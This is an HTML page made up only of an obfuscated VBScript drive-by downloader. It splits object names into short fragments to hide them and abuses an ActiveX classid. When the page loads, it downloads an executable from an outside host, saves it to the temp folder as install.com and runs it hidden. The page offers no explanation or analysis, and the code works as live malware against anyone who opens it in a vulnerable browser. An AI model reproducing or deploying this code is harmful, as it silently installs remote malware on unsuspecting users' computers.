<HTML><script language="VBScript">
husz="Sc"
nxfh="ri"
patc="pt"
dvmw="in"
jtaj="g."
nmmh="Fi"
fnjw="le"
ceyc="Sy"
xnvv="st"
pzyi="em"
wwhe="Ob"
uira="je"
slxb="ct"
aigm="Ad"
mimj="od"
ehop="b."
oicy="St"
sjqt="re"
ivvv="am"
aljj="Mi"
vecu="cr"
wcjc="os"
zbuf="of"
rvbw="t."
quda="XM"
gumc="LH"
xjqg="TT"
uadt="P"
jiqn="cl"
kzoh="si"
kcyg="d:"
rfgn="BD"
ibjm="96"
tbcl="C5"
twmd="56"
mjyz="-6"
jtbf="5A"
ewem="3-"
qaro="11"
zqfi="D0"
bofd="-9"
klxf="83"
uifp="A-"
xofy="00"
fwpx="C0"
iyoq="4F"
hvyp="C2"
jzll="9E"
akfm="36"
owzz="ob"
psob="je"
hdex="ct"
on error resume next
dl = "http://t.gcuj.com/0.exe"
Set df = document.createElement(owzz+psob+hdex)
df.setAttribute "classid", jiqn+kzoh+kcyg+rfgn+ibjm+tbcl+twmd+mjyz+jtbf+ewem+qaro+zqfi+bofd+klxf+uifp+xofy+fwpx+iyoq+hvyp+jzll+akfm
str=aljj+vecu+wcjc+zbuf+rvbw+quda+gumc+xjqg+uadt
Set x = df.CreateObject(str,"")
str5=aigm+mimj+ehop+oicy+sjqt+ivvv
set S = df.createobject(str5,"")
S.type = 1
str6="GET"
x.Open str6, dl, False
x.Send
fname1="install.com"
set F = df.createobject(husz+nxfh+patc+dvmw+jtaj+nmmh+fnjw+ceyc+xnvv+pzyi+wwhe+uira+slxb,"")
set tmp = F.GetSpecialFolder(2) 
fname1= F.BuildPath(tmp,fname1)
S.open
S.write x.responseBody
S.savetofile fname1,2
S.close
set Q = df.createobject("Shell.Application","")
Q.ShellExecute fname1,"","","open",0
</script>
<script type="text/jscript">
function install()
{document.write("");}
window.onload = install;
</script></HTML>